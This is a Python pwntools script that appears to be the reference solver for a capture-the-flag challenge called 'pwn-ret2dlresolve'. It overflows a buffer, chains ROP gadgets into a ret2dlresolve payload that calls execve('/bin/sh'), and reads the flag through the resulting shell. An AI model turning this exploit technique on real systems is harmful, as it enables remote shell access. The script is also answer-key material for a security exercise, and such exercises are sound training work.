#!/usr/bin/env python3
import argparse
import os
import sys

from pwn import ELF, ROP, Ret2dlresolvePayload, context, fit, remote


OFFSET = 0x48


def default_binary():
    candidates = [
        os.path.join("build", "runtime", "home", "ctf", "pwn"),
        os.path.join("attachments", "pwn"),
    ]
    for path in candidates:
        if os.path.exists(path):
            return path
    return candidates[0]


def main():
    parser = argparse.ArgumentParser(description="Exploit the pwn-ret2dlresolve challenge")
    parser.add_argument("--host", default="127.0.0.1", help="target host")
    parser.add_argument("--port", type=int, default=8000, help="target port")
    parser.add_argument("--binary", default=default_binary(), help="local ELF path")
    parser.add_argument("--expect", default="", help="fail if this string is missing in output")
    args = parser.parse_args()

    context.log_level = "error"
    context.binary = ELF(args.binary, checksec=False)
    context.arch = "amd64"

    elf = context.binary
    rop = ROP(elf)
    dlresolve = Ret2dlresolvePayload(elf, symbol="execve", args=["/bin/sh", 0, 0])

    rop.read(0, dlresolve.data_addr, len(dlresolve.payload))
    rop.ret2dlresolve(dlresolve)

    stage1 = fit({OFFSET: rop.chain()}, filler=b"A", length=0x200)
    stage2 = dlresolve.payload + b"cat flag\nexit\n"

    io = remote(args.host, args.port)
    io.recvuntil(b"payload:\n")
    io.send(stage1)
    io.send(stage2)

    data = io.recvrepeat(1.5)
    sys.stdout.write(data.decode("latin-1", errors="replace"))

    if args.expect and args.expect.encode() not in data:
        print(f"expected substring not found: {args.expect}", file=sys.stderr)
        raise SystemExit(1)


if __name__ == "__main__":
    main()
